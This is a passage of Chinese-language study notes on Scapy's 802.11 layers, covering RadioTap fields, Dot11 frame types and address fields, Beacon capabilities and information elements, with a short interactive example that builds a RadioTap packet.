RU值</span></td></tr><tr><td><span>0xf000</span></td><td><span>(保留)</span></td></tr></tbody></table></figure></li></ul></li></ul></li><li><p><code>HE_MU_other_user</code></p><ul><li><p><span>结构: </span></p><ul><li><span>16 bits per_user_1, 16 bits per_user_2</span></li><li><span>8 bits per_user_position,8 bits  per_user_known</span></li></ul></li><li><p><span>此字段包含来自SIG-B的per-user字段的数据, 用于可能尚未捕获其数据的额外用户. 通常不需要此字段；如果捕获了HE_MU PPDU, 则通常仅捕获许多用户之一, 在这种情况下, 所有数据可以在HE和HE-MU字段中进行编码.如果可以捕获更多的SIG-B, 则此字段允许在radiotap中捕获数据数据. 对于已经捕获到数据的用户, 可以但不必具有此字段. 请注意, MCS/DCM/etc. 捕数据的配置已经在常规HE字段中进行了编码, 对于SIG-B, 它是HE-MU字段的一部分.                 </span></p></li><li><p><span>变量名: hemuou_per_user_1</span></p><figure><table><thead><tr><th><span>值</span></th><th><span>含义</span></th></tr></thead><tbody><tr><td><span>0x7fff</span></td><td><span>HE-SIG-B用户字段的B0-B14</span></td></tr><tr><td><span>0x8000</span></td><td><span>保留</span></td></tr></tbody></table></figure></li><li><p><span>变量名: hemuou_per_user_2</span></p><figure><table><thead><tr><th><span>值</span></th><th><span>含义</span></th></tr></thead><tbody><tr><td><span>0x003f</span></td><td><span>符合规范的HE-SIG-B用户字段的B15-B20</span></td></tr><tr><td><span>0xffc0</span></td><td><span>保留</span></td></tr></tbody></table></figure></li><li><p><span>变量名: hemuou_per_user_position</span></p><ul><li><span>包含此用户字段的位置, 从0开始.</span></li></ul></li><li><p><span>变量名: hemuou_per_user_known</span></p><figure><table><thead><tr><th><span>值</span></th><th><span>含义</span></th></tr></thead><tbody><tr><td><span>0x01</span></td><td><span>用户字段位置已知</span></td></tr><tr><td><span>0x02</span></td><td><span>用户字段位置已知</span></td></tr><tr><td><span>0x04</span></td><td><span>用户字段位置已知</span></td></tr><tr><td><span>0x08</span></td><td><span>已知发射波束成形(B14, 仅适用于非MU-MIMO)</span></td></tr><tr><td><span>0x10</span></td><td><span>已知空间配置(仅B11-B14, 仅适用于MU-MIMO)</span></td></tr><tr><td><span>0x20</span></td><td><span>已知MCS(B15-18)</span></td></tr><tr><td><span>0x40</span></td><td><span>已知DCM(B19)</span></td></tr><tr><td><span>0x80</span></td><td><span>已知编码(B20)</span></td></tr></tbody></table></figure></li></ul></li><li><p><code>zero_length_psdu</code></p><ul><li><p><span>0-length-PSDU </span></p></li><li><p><span>结构: 8 bits zero_length_psdu</span></p></li><li><p><span>此字段的存在指示此PPDU中没有捕获PSDU, 也没有捕获到PSDU, 只有PHY数据有效, 并且radiotap头后面没有802.11头. </span></p></li><li><p><span>类型值含义</span></p><figure><table><thead><tr><th><span>类型值</span></th><th><span>含义</span></th></tr></thead><tbody><tr><td><span>0</span></td><td><span>探测PPDU</span></td></tr><tr><td><span>1</span></td><td><span>未捕获数据(例如, 多用户PPDU)</span></td></tr><tr><td><span>0xff</span></td><td><span>供应商指定</span></td></tr></tbody></table></figure></li></ul></li><li><p><code>L_SIG</code></p><ul><li><p><span>结构: 16bits data1, data2</span></p></li><li><p><span>变量名: lsig_data1</span></p><figure><table><thead><tr><th><span>值</span></th><th><span>含义</span></th></tr></thead><tbody><tr><td><span>0x0001</span></td><td><span>速度已知</span></td></tr><tr><td><span>0x0002</span></td><td><span>长度已知</span></td></tr><tr><td><span>0xfffc</span></td><td><span>(保留)</span></td></tr></tbody></table></figure></li><li><p><span>变量名: lsig_length</span></p></li><li><p><span>变量名: lsig_rate</span></p></li></ul></li><li><p><code>b28</code></p><ul><li><span>TLV fields in radiotap</span></li><li><a href='https://www.radiotap.org/fields/TLV.html' target='_blank' class='url'>https://www.radiotap.org/fields/TLV.html</a></li></ul></li><li><p><code>RadiotapNS</code></p><ul><li><span>Radiotap Namespace</span></li></ul></li><li><p><code>VendorNS</code></p></li><li><p><code>Ext</code></p></li></ul></li><li><p><span>当present中未设置为1时, 则忽略对应数据的值</span></p></li><li><p><span>例:</span></p><pre class="md-fences md-end-block ty-contain-cm modeLoaded" spellcheck="false" lang="" style="break-inside: unset;"><div class="CodeMirror cm-s-inner cm-s-null-scroll CodeMirror-wrap" lang=""><div style="overflow: hidden; position: relative; width: 3px; height: 0px; top: 10.3394px; left: 3.99304px;"><textarea autocorrect="off" autocapitalize="off" spellcheck="false" tabindex="0" style="position: absolute; bottom: -1em; padding: 0px; width: 1000px; height: 1em; outline: none;"></textarea></div><div class="CodeMirror-scrollbar-filler" cm-not-content="true"></div><div class="CodeMirror-gutter-filler" cm-not-content="true"></div><div class="CodeMirror-scroll" tabindex="-1"><div class="CodeMirror-sizer" style="margin-left: 0px; margin-bottom: 0px; border-right-width: 0px; padding-right: 0px; padding-bottom: 0px;"><div style="position: relative; top: 0px;"><div class="CodeMirror-lines" role="presentation"><div role="presentation" style="position: relative; outline: none;"><div class="CodeMirror-measure"><pre><span>xxxxxxxxxx</span></pre></div><div class="CodeMirror-measure"></div><div style="position: relative; z-index: 1;"></div><div class="CodeMirror-code" role="presentation" style=""><div class="CodeMirror-activeline" style="position: relative;"><div class="CodeMirror-activeline-background CodeMirror-linebackground"></div><div class="CodeMirror-gutter-background CodeMirror-activeline-gutter" style="left: 0px; width: 0px;"></div><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;">&gt;&gt;&gt; [v for v in RadioTap(present=1).present.names]</span></pre></div><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;">['TSFT',</span></pre><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;">'Flags',</span></pre><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;">'Rate',</span></pre><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;">'Channel',</span></pre><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;">...</span></pre><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;">'VendorNS',</span></pre><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;">'Ext']</span></pre><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;">&gt;&gt;&gt; a = RadioTap(Rate=20)</span></pre><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;">&gt;&gt;&gt; a.show()</span></pre><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;">###[ RadioTap dummy ]###</span></pre><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;">version= 0</span></pre><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;">pad= 0</span></pre><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;">len= None</span></pre><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;">present= None</span></pre><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;">notdecoded= ''</span></pre><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;"><span cm-text="" cm-zwsp="">
</span></span></pre><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;">&gt;&gt;&gt; a.present='Rate+HE'</span></pre><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;">&gt;&gt;&gt; a.show()</span></pre><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;">###[ RadioTap dummy ]###</span></pre><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;"> &nbsp;  version= 0</span></pre><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;">pad= 0</span></pre><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;">len= None</span></pre><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;">present= Rate+HE</span></pre><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;">Rate= 20</span></pre><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;">he_data1= 0</span></pre><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;">he_data2= 0</span></pre><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;">he_data3= 0</span></pre><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;">he_data4= 0</span></pre><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;">he_data5= 0</span></pre><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;">he_data6= 0</span></pre><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;">notdecoded= ''</span></pre></div></div></div></div></div><div style="position: absolute; height: 0px; width: 1px; border-bottom: 0px solid transparent; top: 790px;"></div><div class="CodeMirror-gutters" style="display: none; height: 790px;"></div></div></div></pre><p></details></p></li></ul></li></ul><h3 id='122dot11scapylayersdot11dot11'><span>12.2.Dot11:</span><code>scapy.layers.dot11.Dot11</code></h3><blockquote><p><span>无线局域网通用的标准</span></p></blockquote><ul><li><a href='https://mrncciew.com/2014/09/28/cwap-mac-headeraddresses/' target='_blank' class='url'>https://mrncciew.com/2014/09/28/cwap-mac-headeraddresses/</a></li><li><a href='http://80211notes.blogspot.com/2013/09/understanding-address-fields-in-80211.html' target='_blank' class='url'>http://80211notes.blogspot.com/2013/09/understanding-address-fields-in-80211.html</a></li><li><a href='http://www.iitk.ac.in/mla/rgandhi%20website/80211b/frame_formats.htm' target='_blank' class='url'>http://www.iitk.ac.in/mla/rgandhi%20website/80211b/frame_formats.htm</a></li><li><img src="images/Scapy/2019-12-29-22-21-28.png" referrerpolicy="no-referrer"></li></ul><details></details><ul><li><p><span>变量名: proto </span></p><ul><li><span>此字段仅用于指示帧使用的是802.11的哪个协议版本.这总是设置为“0”, 因为当前存在802.11技术的一个版本.</span></li></ul></li><li><p><span>变量名: type</span></p><ul><li><span>标准中定义了三种类型(管理、控制、数据)的无线帧.下面显示了“Type”字段对应每个字段的位值</span></li><li><span>取值: [&quot;Management&quot;, &quot;Control&quot;, &quot;Data&quot;, &quot;Reserved&quot;]</span></li></ul></li><li><p><span>变量名: subtype</span></p><ul><li><p><span>有许多不同种类的管理、控制和数据帧.因此需要4位的子类型字段来区分它们        </span></p><figure><table><thead><tr><th><span>Type Value(B3..B2)</span></th><th><span>Type Description</span></th><th><span>Subtype Value (B7..b4)</span></th><th><span>Subtype Description</span></th></tr></thead><tbody><tr><td><span>00</span></td><td><span>Management</span></td><td><span>0000</span></td><td><span>Association Request</span></td></tr><tr><td><span>00</span></td><td><span>Management</span></td><td><span>0001</span></td><td><span>Association Response</span></td></tr><tr><td><span>00</span></td><td><span>Management</span></td><td><span>0010</span></td><td><span>Reassociation Request</span></td></tr><tr><td><span>00</span></td><td><span>Management</span></td><td><span>0011</span></td><td><span>Reassociation Response</span></td></tr><tr><td><span>00</span></td><td><span>Management</span></td><td><span>0100</span></td><td><span>Probe Request</span></td></tr><tr><td><span>00</span></td><td><span>Management</span></td><td><span>0101</span></td><td><span>Probe Response</span></td></tr><tr><td><span>00</span></td><td><span>Management</span></td><td><span>0110</span></td><td><span>Timing Advertisement</span></td></tr><tr><td><span>00</span></td><td><span>Management</span></td><td><span>0111</span></td><td><span>Reserved</span></td></tr><tr><td><span>00</span></td><td><span>Management</span></td><td><span>1000</span></td><td><span>Beacon</span></td></tr><tr><td><span>00</span></td><td><span>Management</span></td><td><span>1001</span></td><td><span>ATIM</span></td></tr><tr><td><span>00</span></td><td><span>Management</span></td><td><span>1010</span></td><td><span>Disassociation</span></td></tr><tr><td><span>00</span></td><td><span>Management</span></td><td><span>1011</span></td><td><span>Authentication</span></td></tr><tr><td><span>00</span></td><td><span>Management</span></td><td><span>1100</span></td><td><span>Deauthentication</span></td></tr><tr><td><span>00</span></td><td><span>Management</span></td><td><span>1101</span></td><td><span>Action</span></td></tr><tr><td><span>00</span></td><td><span>Management</span></td><td><span>1110</span></td><td><span>Action No Ack (NACK)</span></td></tr><tr><td><span>00</span></td><td><span>Management</span></td><td><span>1111</span></td><td><span>Reserved</span></td></tr><tr><td><span>01</span></td><td><span>Control</span></td><td><span>0000-0001</span></td><td><span>Reserved</span></td></tr><tr><td><span>01</span></td><td><span>Control</span></td><td><span>0010</span></td><td><span>Trigger</span></td></tr><tr><td><span>01</span></td><td><span>Control</span></td><td><span>0100</span></td><td><span>Beamforming Report Poll</span></td></tr><tr><td><span>01</span></td><td><span>Control</span></td><td><span>0101</span></td><td><span>VHT/HE NDP Announcement</span></td></tr><tr><td><span>01</span></td><td><span>Control</span></td><td><span>0110</span></td><td><span>Control Frame Extension</span></td></tr><tr><td><span>01</span></td><td><span>Control</span></td><td><span>0111</span></td><td><span>Control Wrapper</span></td></tr><tr><td><span>01</span></td><td><span>Control</span></td><td><span>1000</span></td><td><span>Block Ack Request (BAR)</span></td></tr><tr><td><span>01</span></td><td><span>Control</span></td><td><span>1001</span></td><td><span>Block Ack (BA)</span></td></tr><tr><td><span>01</span></td><td><span>Control</span></td><td><span>1010</span></td><td><span>PS-Poll</span></td></tr><tr><td><span>01</span></td><td><span>Control</span></td><td><span>1011</span></td><td><span>RTS</span></td></tr><tr><td><span>01</span></td><td><span>Control</span></td><td><span>1100</span></td><td><span>CTS</span></td></tr><tr><td><span>01</span></td><td><span>Control</span></td><td><span>1101</span></td><td><span>ACK</span></td></tr><tr><td><span>01</span></td><td><span>Control</span></td><td><span>1110</span></td><td><span>CF-End</span></td></tr><tr><td><span>01</span></td><td><span>Control</span></td><td><span>1111</span></td><td><span>CF-End + CF-ACK</span></td></tr><tr><td><span>10</span></td><td><span>Data</span></td><td><span>0000</span></td><td><span>Data</span></td></tr><tr><td><span>10</span></td><td><span>Data</span></td><td><span>0001</span></td><td><span>Data + CF-ACK</span></td></tr><tr><td><span>10</span></td><td><span>Data</span></td><td><span>0010</span></td><td><span>Data + CF-Poll</span></td></tr><tr><td><span>10</span></td><td><span>Data</span></td><td><span>0011</span></td><td><span>Data + CF-ACK + CF-Poll</span></td></tr><tr><td><span>10</span></td><td><span>Data</span></td><td><span>0100</span></td><td><span>Null (no data)</span></td></tr><tr><td><span>10</span></td><td><span>Data</span></td><td><span>0101</span></td><td><span>CF-ACK (no data)</span></td></tr><tr><td><span>10</span></td><td><span>Data</span></td><td><span>0110</span></td><td><span>CF-Poll (no data)</span></td></tr><tr><td><span>10</span></td><td><span>Data</span></td><td><span>0111</span></td><td><span>CF-ACK + CF-Poll (no data)</span></td></tr><tr><td><span>10</span></td><td><span>Data</span></td><td><span>1000</span></td><td><span>QoS Data</span></td></tr><tr><td><span>10</span></td><td><span>Data</span></td><td><span>1001</span></td><td><span>QoS Data + CF-ACK</span></td></tr><tr><td><span>10</span></td><td><span>Data</span></td><td><span>1010</span></td><td><span>QoS Data + CF-Poll</span></td></tr><tr><td><span>10</span></td><td><span>Data</span></td><td><span>1011</span></td><td><span>QoS Data + CF-ACK + CF-Poll</span></td></tr><tr><td><span>10</span></td><td><span>Data</span></td><td><span>1100</span></td><td><span>QoS Null (no data)</span></td></tr><tr><td><span>10</span></td><td><span>Data</span></td><td><span>1101</span></td><td><span>Reserved</span></td></tr><tr><td><span>10</span></td><td><span>Data</span></td><td><span>1110</span></td><td><span>QoS CF-Poll (no data)</span></td></tr><tr><td><span>10</span></td><td><span>Data</span></td><td><span>1111</span></td><td><span>QoS CF-ACK + CF-Poll (no data)</span></td></tr><tr><td><span>11</span></td><td><span>Extension</span></td><td><span>0000</span></td><td><span>DMG Beacon</span></td></tr><tr><td><span>11</span></td><td><span>Extension</span></td><td><span>0001-1111</span></td><td><span>Reserved</span></td></tr></tbody></table></figure></li></ul></li><li><p><span>变量名: FCfield</span></p><ul><li><p><span>取值: </span></p><ul><li><p><span>&quot;to-DS&quot;</span></p><ul><li><span>发送到分配系统</span></li></ul></li><li><p><span>&quot;from-DS&quot;</span></p><ul><li><span>来自��配系统</span></li></ul></li><li><p><span>&quot;MF&quot;</span></p><ul><li><span>More-Fragments</span></li></ul></li><li><p><span>&quot;retry&quot;</span></p><ul><li><span>数据或管理帧是前一帧的&quot;部分重传&quot;</span></li></ul></li><li><p><span>&quot;pw-mgt&quot;</span></p><ul><li><span>Power Management</span></li></ul></li><li><p><span>&quot;MD&quot;</span></p><ul><li><span>More Data</span></li></ul></li><li><p><span>&quot;protected&quot;</span></p><ul><li><span>Protected Frame</span></li></ul></li><li><p><span>&quot;order&quot;</span></p><ul><li><span>+HTC/Order, 表示该帧包含HT控制字段</span></li></ul></li></ul></li></ul></li><li><p><span>变量名: ID</span></p><ul><li><span>Duration ID</span></li></ul></li><li><p><span>变量名: SC</span></p><ul><li><span>Sequence Control</span></li></ul></li><li><p><span>变量名: addr1, add2, add3, add4</span></p><ul><li><span>SA(Source Address): 源点地址</span></li><li><span>TA(Transmitter Address) : 发送端</span></li><li><span>RA(Receiver Address) : 接收端</span></li><li><span>DA(Destination Address) : 终点地址</span></li><li><span>BSSID (Basic Service Set IDentifier) : 基站集ID</span></li><li><img src="images/Scapy/2019-12-29-23-12-16.png" referrerpolicy="no-referrer"></li></ul><figure><table><thead><tr><th><span>To DS</span></th><th><span>From DS</span></th><th><span>Address 1</span></th><th><span>Address 2</span></th><th><span>Address 3</span></th><th><span>Address 4</span></th><th><span>含义</span></th></tr></thead><tbody><tr><td><span>0</span></td><td><span>0</span></td><td><span>接收端: 终点地址</span></td><td><span>发送端: 源点地址</span></td><td><span>基站集ID</span></td><td><span>Not used</span></td><td><span>控制帧或管理帧</span></td></tr><tr><td><span>0</span></td><td><span>1</span></td><td><span>接收端: 终点地址</span></td><td><span>发送端: 基站集ID</span></td><td><span>源地址</span></td><td><span>Not used</span></td><td><span>WiFi无线路由器到客户端</span></td></tr><tr><td><span>1</span></td><td><span>0</span></td><td><span>接收端: 基站集ID</span></td><td><span>发送端: 源点地址</span></td><td><span>终点地址</span></td><td><span>Not used</span></td><td><span>客户端到WiFi无线路由器</span></td></tr><tr><td><span>1</span></td><td><span>1</span></td><td><span>接收端</span></td><td><span>发送端</span></td><td><span>终点地址</span></td><td><span>源点地址</span></td><td><span>使用WDS–无线分配系统(例如网桥, 网状AP, 中继器)</span></td></tr><tr><td></details></td><td>&nbsp;</td><td>&nbsp;</td><td>&nbsp;</td><td>&nbsp;</td><td>&nbsp;</td><td>&nbsp;</td></tr></tbody></table></figure></li></ul><h3 id='123dot11beaconscapylayersdot11dot11beacon'><span>12.3.Dot11Beacon:</span><code>scapy.layers.dot11.Dot11Beacon</code></h3><blockquote><p><span>信标帧是基于IEEE 802.11的WLAN 中的管理帧之一.它包含有关网络的所有信息.信标帧是定期发送的, 它们用于宣告无线局域网的存在并同步服务集的成员.</span></p></blockquote><details></details><ul><li><p><span>timestamp</span></p><ul><li><span>接收到信标帧后, 所有端都将其本地时钟更改为此时间.这有助于同步.</span></li></ul></li><li><p><span>beacon_interval</span></p><ul><li><span>这是信标传输之间的时间间隔.节点(处于ad hoc或P2P GO模式的AP, 端)必须发送信标的时间称为目标信标传输时间(TBTT).信标间隔以时间单位(TU)表示.它是AP中的一个可配置参数, 通常配置100 TU, 1 TU = 1024 microseconds</span></li></ul></li><li><p><span>cap</span></p><ul><li><p><span>取值: </span></p><ul><li><p><span>short-slot</span></p><ul><li><span>G Mode Short Slot Time [20 microseconds]</span></li></ul></li><li><p><span>DSSS-OFDM</span></p><ul><li><span>DSSS-OFDM Allowed</span></li></ul></li><li><p><span>ESS</span></p><ul><li><span>ESS Type Network</span></li></ul></li><li><p><span>IBSS</span></p><ul><li><span>IBSS Type Network</span></li></ul></li><li><p><span>CFP</span></p><ul><li><span>CF Pollable</span></li></ul></li><li><p><span>CFP-req</span></p><ul><li><span>CF Poll Requested</span></li></ul></li><li><p><span>privacy</span></p><ul><li><span>Privacy enabled</span></li></ul></li><li><p><span>short-preamble</span></p><ul><li><span>Short Preamble Allowed</span></li></ul></li><li><p><span>PBCC</span></p><ul><li><span>PBCC Allowed</span></li></ul></li><li><p><span>agility</span></p><ul><li><span>CHannel Agility Used</span></li></ul></li><li><p><span>res8</span></p></li><li><p><span>res9</span></p></li><li><p><span>res11</span></p></li><li><p><span>res12</span></p></li><li><p><span>res14</span></p></li><li><p><span>res15</span>
</details></p></li></ul></li></ul></li></ul><h3 id='124dot11eltscapylayersdot11dot11elt'><span>12.4.Dot11Elt:</span><code>scapy.layers.dot11.Dot11Elt</code></h3><blockquote><p><span>802.11 information elements</span></p></blockquote><ul><li><a href='https://www.oreilly.com/library/view/80211-wireless-networks/0596100523/ch04.html' target='_blank' class='url'>https://www.oreilly.com/library/view/80211-wireless-networks/0596100523/ch04.html</a></li></ul><details></details><ul><li><p><span>ID </span></p><ul><li><p><span>字段名</span></p></li><li><p><span>取值: {0: &quot;SSID&quot;,1: &quot;Rates&quot;,2: &quot;FHset&quot;,3: &quot;DSset&quot;,4: &quot;CFset&quot;,5: &quot;TIM&quot;,6: &quot;IBSSset&quot;,7: &quot;Country&quot;,10: &quot;Request&quot;,16: &quot;challenge&quot;,33: &quot;PowerCapability&quot;,36:&quot;Channels&quot;42: &quot;ERPinfo&quot;,45: &quot;HTCapabilities&quot;,46: &quot;QoSCapability&quot;,47: &quot;ERPinfo&quot;,48: &quot;RSNinfo&quot;,50: &quot;ESRates&quot;,52: &quot;PowerConstraint&quot;,61: &quot;HTinfo&quot;,68: &quot;reserved&quot;,107:&quot;Interworking&quot;127: &quot;ExtendendCapatibilities&quot;,191: &quot;VHTCapabilities&quot;,221: &quot;vendor&quot;}</span></p></li><li><p><span>&quot;SSID&quot;</span></p><ul><li><span>Service Set Identity 32 bytes, network name </span></li><li><span>零字节的情况是一种特殊的情况, 称为广播SSID;它仅用于当一个端试图发现其区域内的所有802.11网络时的探测请求帧.</span></li></ul></li><li><p><span>&quot;Rates&quot;</span></p><ul><li><p><span>Supported Rates</span></p></li><li><p><span>无线局域网的几个数据速率已经标准化.支持的速率信息元素允许802.11网络指定它支持的数据速率.当移动台试图加入网络时, 它们检查网络中使用的数据速率.有些费率是强制性的, 须由移动支持, 而其他费率是可选的.</span></p></li><li><p><span>Dot11EltRates: </span><code>scapy.layers.dot11.Dot11EltRates</code></p><ul><li><span>ID</span></li><li><span>len</span></li><li><span>rates</span></li></ul></li><li><p><img src="images/Scapy/2019-12-30-09-56-29.png" referrerpolicy="no-referrer"></p></li></ul></li><li><p><span>&quot;FHset&quot;</span></p><ul><li><p><span>FH Parameter Set</span></p></li><li><p><img src="images/Scapy/2019-12-30-08-08-55.png" referrerpolicy="no-referrer"></p></li><li><p><span>Dwell Time</span></p><ul><li><span>跳频网络从一个频道跳到另一个频道.在跳频序列中每个通道上花费的时间称为驻留时间.它以时间单位(TUs)表示.</span></li></ul></li><li><p><span>Hop Set</span></p><ul><li><span>802.11 frequency-hopping PHY定义了几种hop模式, 标识正在使用的一组hop模式.</span></li></ul></li><li><p><span>Hop Pattern</span></p><ul><li><span>站从集合中选择一个跳跃模式.这个字段也是一个字节, 用于识别正在使用的跳跃模式.</span></li></ul></li><li><p><span>Hop Indexs</span></p><ul><li><span>每个模式都由一长串的通道跃点组成.该字段(单个字节)标识跳序列中的当前点.</span></li></ul></li></ul></li><li><p><span>&quot;DSset&quot;</span></p><ul><li><span>DS Parameter Set</span></li><li><span>802.11网络只有一个参数:网络使用的信道号</span></li><li><img src="images/Scapy/2019-12-30-08-32-17.png" referrerpolicy="no-referrer"></li></ul></li><li><p><span>&quot;CFset&quot;</span></p><ul><li><span>CF Parameter Set</span></li><li><span>CF参数集信息元素通过支持无争用操作的访问点在信标中传输</span></li></ul></li><li><p><span>&quot;TIM&quot;</span></p><ul><li><p><span>Traffic Indication Map (TIM)</span></p></li><li><p><span>AP缓冲帧用于移动端在低功率模式下睡眠. AP定期尝试将缓冲帧发送到睡眠状态下的移动端. 这样安排的一个实际原因是, 给发送端供电比简单地打开接收端更耗电, 但是802.11的设计者想了池供电的移动端, 为了延长低功耗设备的电池寿命, 决定将缓冲帧定期发送到移动端</span></p></li><li><p><img src="images/Scapy/2019-12-30-08-33-45.png" referrerpolicy="no-referrer"></p></li><li><p><span>DTIM Count</span></p><ul><li><span>这个单字节字段是下一个DTIM帧之前要传输的信标的数量.DTIM帧表明缓冲广播和多播帧将很快交付.并不是所有的信标帧都是DTIM帧.</span></li></ul></li><li><p><span>DTIM Period</span></p><ul><li><span>这个单字节字段表示DTIM帧之间的信标间隔数.0是保留的, 没有使用.DTIM计数周期从周期到0.</span></li></ul></li><li><p><span>Bitmap Control and Partial Virtual Bitmap</span></p><ul><li><span>位图控制字段分为两个子字段.第0位用于关联ID 0的流量指示状态, 为多播流量预留.位图控制字段的其余7位用于位图偏移字段.为了节省传输能力, 位图偏移字段可以用来传输虚拟位图的一部分.位图偏移量与虚拟位图的开始有关.通过使用位图偏移量和长度, 802.11端可以推断出虚拟位图的哪一部分包含在内.</span></li></ul></li></ul></li><li><p><span>&quot;IBSSset&quot;</span></p><ul><li><span>IBSS Parameter Set</span></li><li><span>IBSSs目前只有一个参数, 即announcement流量指示映射(ATIM)窗口, 如图所示.此字段仅用于IBSS信标帧.它表示IBSS中ATIM帧之间的时间单位(TUs)的数量.</span></li><li><img src="images/Scapy/2019-12-30-08-49-54.png" referrerpolicy="no-referrer"></li></ul></li><li><p><span>&quot;Country&quot;</span></p><ul><li><p><span>Country String (3 bytes)</span></p><ul><li><span>一种由三个字符组成的ASCII字符串, 表示端正在操作的位置.前两个字母是ISO国家代码(例如, “US”代表美国).许多国家对室内和室外有不同的规定, 第三个特点是两者的区别.当一组综合规则覆盖所有环境时, 第三个字符是一个空间.为了指定室内或室外规则, 第三个字符可以分别设置为“I”或“O”.</span></li></ul></li><li><p><span>First Channel Number (1 byte)</span></p><ul><li><span>第一个通道号是受功率约束的最低通道</span></li></ul></li><li><p><span>Number of Channels (1 byte)</span></p><ul><li><span>受功率约束的频带的大小由通道的数目表示.通道的大小与物理层有关.</span></li></ul></li><li><p><span>Maximum Transmit Power (1 byte)</span></p><ul><li><span>最大发射功率, 用dBm表示.</span></li></ul></li><li><p><span>Pad (1 byte; optional)</span></p><ul><li><span>信息元素的大小必须是偶数字节.如果信息元素的长度是奇数字节, 则将单个字节的零作为小块追加.</span></li></ul></li></ul></li><li><p><span>&quot;Request&quot;</span></p><ul><li><span>在探测请求帧中, 请求信息元素用于向网络请求某些信息元素.请求信息元素具有类型/长度头, 后面是一个整数列表, 其中包含被请求的信息元素的编号</span></li><li><img src="images/Scapy/2019-12-30-08-55-39.png" referrerpolicy="no-referrer"></li></ul></li><li><p><span>&quot;challenge&quot;</span></p><ul><li><span>Challenge text</span></li><li><span>由802.11定义的共享密钥认证系统要求移动端成功地解密一个加密的challenge.使用challenge text信息元素发送质询</span></li><li><img src="images/Scapy/2019-12-30-08-56-43.png" referrerpolicy="no-referrer"></li></ul></li><li><p><span>&quot;PowerCapability&quot;</span></p><ul><li><span>Power Capability</span></li><li><span>802.11端是由电池供电的, 而且端的功能通常不如AP, 部分原因是通常不需要移动客户端设备以高功率进行传输.Power Capability信息元素允许端报告其最小和最大传输功率, 单位为dBm</span></li><li><img src="images/Scapy/2019-12-30-08-59-39.png" referrerpolicy="no-referrer"></li></ul></li><li><p><span>&quot;Channels&quot;</span></p><ul><li><span>Supported Channels</span></li><li><span>支持的Channels信息元素类似于Country信息元素, 因为它描述了支持的子频带.在标头之后, 有一系列子带描述符.每个子带描述符由第一个通道号(它是受支持的子带中的最小通道号)子带中通道数量组成.例如, 只支持通道号40到52的设备将把第一个通道号设置为40, 通道数量设置为12(52-40).</span></li><li><img src="images/Scapy/2019-12-30-09-07-02.png" referrerpolicy="no-referrer"></li></ul></li><li><p><span>&quot;ERPinfo&quot;</span></p><ul><li><p><span>ERP information</span></p></li><li><p><span>802.11g定义了扩展速率PHY (extended rate PHY, ERP).为了提供向后兼容性, 定义了ERP信息元素, 如图所示.在它的第一次迭代中, 它是一个字节中的三个位标志</span></p></li><li><p><span>Non-ERP present</span></p><ul><li><span>当一个旧协议的、非802.11g的端连接到网络时, 将设置这个位.当检测到不能使用802.11g的重叠网络时, 也可以设置.</span></li></ul></li><li><p><span>Use Protection</span></p><ul><li><span>当存在不能以802.11g数据速率运行的端时, 保护位设置为1.这使得可以与旧协议的端向后兼容.</span></li></ul></li><li><p><span>Barker Preamble Mode</span></p><ul><li><span>如果与网络相关的端不能使用短序言模式, 则将设置此位.</span></li></ul></li><li><p><img src="images/Scapy/2019-12-30-09-11-45.png" referrerpolicy="no-referrer"></p></li></ul></li><li><p><span>&quot;HTCapabilities&quot;</span></p></li><li><p><span>&quot;QoSCapability&quot;</span></p></li><li><p><span>&quot;ERPinfo&quot;</span></p></li><li><p><span>&quot;RSNinfo&quot;</span></p><ul><li><p><span>Robust Security Network</span></p></li><li><p><span>随着802.11i中显著的安全增强, 有必要开发一种在端之间通信安全信息的方法.主要工具是健壮的安全网络(RSN)信息元素, 如图所示.有几个可变的组件, 在某些情况下, RSN信息元素能会遇信息元素大小超过头部255字节的限制.</span></p></li><li><p><span>Version</span></p><ul><li><span>version字段必须存在.802.11定义了版本1.保留0</span></li></ul></li><li><p><span>Group cipher suite</span></p><ul><li><span>版本号之后是组密码套件描述符.AP必须选择一个与所有相关端兼容的分组密码, 以保护广播和多播帧.只允许一个组密码.密码套件选择器有四个字节长.它以用于供应商的OUI和用于识别密码的数字开始.802.11i使用的OUI是00-0F-AC, 